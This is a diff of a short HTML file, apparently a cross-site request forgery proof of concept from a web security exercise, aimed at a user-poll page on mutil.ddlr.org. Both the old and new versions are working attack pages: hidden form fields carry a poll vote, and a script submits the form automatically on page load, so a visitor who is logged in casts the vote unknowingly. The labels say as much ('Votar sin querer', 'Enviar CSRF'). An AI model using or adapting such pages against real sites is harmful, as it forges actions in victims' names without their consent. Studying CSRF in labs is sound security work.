@@ -1,14 +1,10 @@
-<!-- csrf_userpoll.html -->
-<html>
-  <body>
-    <form action="http://mutil.ddlr.org/index.php?page=user-poll.php" method="POST">
-      <input type="hidden" name="poll_question" value="??" />
-      <input type="hidden" name="poll_choice" value="shur3 😎" />
-      <input type="submit" value="Votar sin querer" />
-    </form>
+<!-- csrf_poll_attack.html -->
+<form action="https://mutil.ddlr.org/index.php?page=user-poll.php" method="POST">
+  <input type="hidden" name="poll_question" value="CSRF desde GitHub" />
+  <input type="hidden" name="poll_choice" value="Shur3 😎" />
+  <input type="submit" value="Enviar CSRF" />
+</form>
 
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+<script>
+  document.forms[0].submit();
+</script>
